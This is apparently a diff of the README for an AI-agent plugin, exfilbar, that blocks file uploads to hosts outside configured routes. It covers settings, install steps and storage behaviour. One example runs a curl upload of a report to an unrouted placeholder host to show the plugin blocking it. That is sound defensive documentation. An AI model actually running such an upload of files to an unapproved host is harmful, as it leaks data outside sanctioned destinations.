@@ -6,7 +6,7 @@ version 0.5.4 · community plugin for Hermes Agent, not by Nous
 
 Hermes can send a file to the wrong host. exfilbar checks recognized uploads from terminal or Python against your routes and blocks an off-route match.
 
-It is not a sandbox: coverage is limited to recognized syntax in `terminal` and `execute_code`, not general egress enforcement. Put the settings below at `plugins.entries.exfilbar.settings` in `config.yaml`.
+It is not a sandbox: coverage is limited to recognized syntax in `terminal` and `execute_code`, not general egress enforcement. See [Install](#install) for setup. The nested example below places settings at `plugins.entries.exfilbar.settings` in the active profile's `config.yaml`.
 
 try the route decision offline, before installing Hermes, from this directory:
 
@@ -17,12 +17,16 @@ python3 demo/routes.py
 same file, two hosts: the registered hook permits the routed HTTPie upload and blocks the off-route attempt. fixture text only, no commands executed, no network, temporary feed. [sample output](demo/ROUTE-HOOK-OUT.txt).
 
 ```yaml
-routes:
-  - paths: ["reports/**"]
-    to: ["https://uploads.example/reports/*"]
-protected_globs: ["private/**", "*.env"]
-destination_globs: []
-block_unresolved: true
+plugins:
+  entries:
+    exfilbar:
+      settings:
+        routes:
+          - paths: ["reports/**"]
+            to: ["https://uploads.example/reports/*"]
+        protected_globs: ["private/**", "*.env"]
+        destination_globs: []
+        block_unresolved: true
 ```
 
 ## What you see
@@ -34,7 +38,7 @@ With the route above, verify without executing a transfer:
 /exfil check curl -T reports/weekly.csv https://elsewhere.example/up
 ```
 
-The first returns PASS; the second returns BLOCK.
+The first returns PASS; the second returns BLOCK. These are dry runs: neither adds a feed row.
 
 1. Upload `reports/weekly.csv` to `https://uploads.example/reports/weekly.csv`. The matching route permits the recognized transfer silently.
 2. Send the same file to `https://elsewhere.example/up`. The hook blocks the tool call and names `route 1` and the allowed host `uploads.example`.
@@ -44,13 +48,33 @@ Desktop adds `exfil · N out · M blocked` for the focused session, red when its
 
 ## Install
 
-Hermes 0.23.0 or later:
+Hermes 0.23.0 or later. Allow roughly 5-9 minutes with Hermes already installed; this is an estimate, not an installed-run measurement.
 
-```sh
-hermes plugins install quotumorg/exfilbar --enable
-```
+1. For the offline rehearsal, clone this repository and enter its root:
 
-Then enable Exfilbar in Desktop's Capabilities > Plugins for the status chip and feed page. For the route rehearsal, run `python3 demo/routes.py`. For the protected-file rehearsal, run `python3 demo/attack.py`. Both inspect fixture strings without running transfer commands.
+   ```sh
+   git clone https://github.com/quotumorg/exfilbar.git
+   cd exfilbar
+   python3 demo/routes.py
+   ```
+
+   The demo takes seconds, uses temporary storage and needs no Hermes or provider. Installing alone does not put `demo/routes.py` in your current directory.
+
+2. Install and enable the backend plugin:
+
+   ```sh
+   hermes plugins install quotumorg/exfilbar --enable
+   hermes plugins list
+   ```
+
+   Confirm `exfilbar` is enabled. This installs the published repository revision; the local checkout's rehearsal does not install that checkout.
+
+3. Merge the nested YAML above into the active profile's `config.yaml`, preserving existing plugin entries. The exact settings key is `plugins.entries.exfilbar.settings`. Use workspace-relative paths or configure `workspace_root` as described below.
+4. Restart the gateway used by Desktop so the API and settings are loaded. Restart an existing CLI chat too. In Desktop, enable Exfilbar under Capabilities > Plugins; rescan if it still has a stale copy. Focus a session on that same connection/profile.
+5. Run `/exfil routes` in that session and confirm `reports/**` points to `uploads.example`. Run the two `/exfil check` examples above. Expect PASS then BLOCK. If `/exfil` is missing, check backend enablement and restart; if routes differ, check the active profile and settings nesting.
+6. To see a real blocked row, follow the [inert first-block fixture](tests/fixtures/first-block.txt) in the focused session. It requires a `terminal` tool dispatch. `/exfil check`, `/exfil demo` and the offline script never populate the real feed. Then run `/exfil status` or open the Desktop chip; its feed refreshes every three seconds. An empty feed can mean no covered tool was dispatched or a different session is focused.
+
+The installed dispatch walkthrough is for the operator to run. The shipped offline demo and tests do not establish installed Desktop behavior. For the separate protected-file rehearsal, run `python3 demo/attack.py` from the checkout; it also inspects fixture strings without executing transfers.
 
 ## Limits at a glance
 
@@ -163,7 +187,7 @@ Sibling callbacks see original args; Hermes merges `modify` directives afterward
 
 Runtime reads and writes its own plugin data directory and uses isolated temporary storage for the synthetic demo. It never reads source file contents. No external network, subprocesses, external file reads, background processes, installed third-party packages, credentials or telemetry. UI requests use the authenticated Hermes backend; the Desktop query and dashboard timer poll every three seconds while mounted (the routes card every ten seconds) and stop with their host lifecycle. The same database keeps the latest routes summary (path globs and hostnames) for the routes card. Commands are capped at 32768 characters, tokenization at 4096 tokens and pipelines at 128 pipe operators. Exceeding a cap is unresolved. At most 32 sessions retain 128 recent recognized transfer records each in `<Hermes home>/plugin-data/exfilbar/egress.db`. Readers and writers resolve the active profile on every call through the documented `plugins.plugin_storage.plugin_data_dir` helper. A read may create an empty plugin directory, but never a database file, write lock or schema. Session identifiers are hashed in full (up to 4096 characters), preventing the old 128-character prefix collision. Missing/invalid session IDs are not pooled; they do not write feed rows. Reload preserves the feed. Old sessions and rows are evicted by most recent write. Local copies, downloads and uncovered tools do not create rows.
 
-Each record holds UTC time, covered tool name, up to 32 workspace-relative source paths (256 characters each, with a truncation flag), scheme+host destination, decision and bounded rule metadata. Unknown sources/destinations are labeled unresolved/unknown. Destination ports and remote/URL paths are omitted from the feed. The data folder is owner-only and the database is owner read/write. SQLite secure deletion clears evicted rows; the database has an 8192-page allocation limit. Writers keep a 25 ms lock timeout. Readers open an existing database in read-only mode with a 1 s lock timeout and never initialize schema, change permissions or set write pragmas. An absent database shows an empty feed without creating files. Rollback journaling is retained: WAL sidecars would require separate size and secure-deletion handling. Readers can coexist with a reserved writer; an exclusive lock can temporarily delay them. A write failure blocks the inspected call without exposing exception details. Failure to read the feed returns an unavailable state. Retained counts can shrink on eviction. This is inspected intent, not a packet capture, byte counter, delivery receipt or a permanent audit log. File paths, hostnames and user-chosen rule metadata may themselves be sensitive and survive plugin removal in the data directory.
+Each record holds UTC time, covered tool name, up to 32 workspace-relative source paths (256 characters each, with a truncation flag), scheme+host destination, decision and bounded rule metadata. Unknown sources/destinations are labeled unresolved/unknown. Destination ports and remote/URL paths are omitted from the feed. The data folder is owner-only and the database is owner read/write. SQLite secure deletion clears evicted rows; the database has an 8192-page allocation limit. Writers serialize setup and transactions per database within each process. Queue acquisition and connection setup share a 50 ms admission deadline per hook. Each connection's SQLite busy timeout is capped at 25 ms and reduced to the remaining admission budget. Schema creation is one transaction. Gates are released on failure and idle profile paths are not retained. Readers open an existing database in read-only mode with a 1 s lock timeout and never initialize schema, change permissions or set write pragmas. An absent database shows an empty feed without creating files. Rollback journaling is retained: WAL sidecars would require separate size and secure-deletion handling. Readers can coexist with a reserved writer; an exclusive lock can temporarily delay them. A write failure blocks the inspected call without exposing exception details. Failure to read the feed returns an unavailable state. Retained counts can shrink on eviction. This is inspected intent, not a packet capture, byte counter, delivery receipt or a permanent audit log. File paths, hostnames and user-chosen rule metadata may themselves be sensitive and survive plugin removal in the data directory.
 
 ## Offline verification and 90-second rehearsal
 
@@ -171,12 +195,13 @@ From the plugin root:
 
 ```sh
 HERMES_SOURCE=/path/to/hermes python3 -m unittest discover -s tests
+python3 demo/routes.py
 python3 demo/run.py
 python3 demo/attack.py
 HERMES_SOURCE=/path/to/hermes node --experimental-vm-modules --test tests/test_desktop.mjs
 ```
 
-Python tests run in one process, including a bounded concurrent-writer case. They cover all transfer families, direction and flag negatives, quoted strings, globs, traversal, malformed/dynamic syntax, bounded output, registrations, settings, and dispatcher suppression.
+Python tests run in one process, including 20 fresh databases with 16 synchronized writers over three rounds and concurrent registered-hook decisions. They cover all transfer families, direction and flag negatives, quoted strings, globs, traversal, malformed/dynamic syntax, bounded output, registrations, settings, and dispatcher suppression.
 
 The install-scan regression test calls the real `tools.plugin_guard.scan_plugin` from `HERMES_SOURCE` on this whole directory and requires a safe verdict with no critical/high findings. It skips with a reason when that variable is unset. Use Python 3.11+ for the Hermes v0.23.0 scanner. Demo command strings remain readable under `tests/fixtures/`, where Hermes recognizes inert test data.
 
@@ -196,4 +221,4 @@ Desktop reads share the SDK query cache: chip and page use the same feed key, wi
 
 connection-qualified Desktop reads with owner mismatch states and stale-response guards. HTTPie multipart file items now follow protected paths and routes. cold glob compilation has a work budget. `python3 demo/routes.py` shows the same-file/two-host decision through the registered hook with an isolated feed.
 
-polling now uses read-only database connections with a 1 s lock timeout; write-only setup stays off the read path. hook writes retain their 25 ms timeout and block on failure. temporary read failures show a retrying unavailable state in Desktop and the dashboard.
+polling now uses read-only database connections with a 1 s lock timeout; write-only setup stays off the read path. concurrent writers share a per-database gate and a 50 ms write-admission deadline per hook, with SQLite waits capped at 25 ms. genuine write failures still block; the hook timing reference remains 100 ms. temporary read failures show a retrying unavailable state in Desktop and the dashboard.
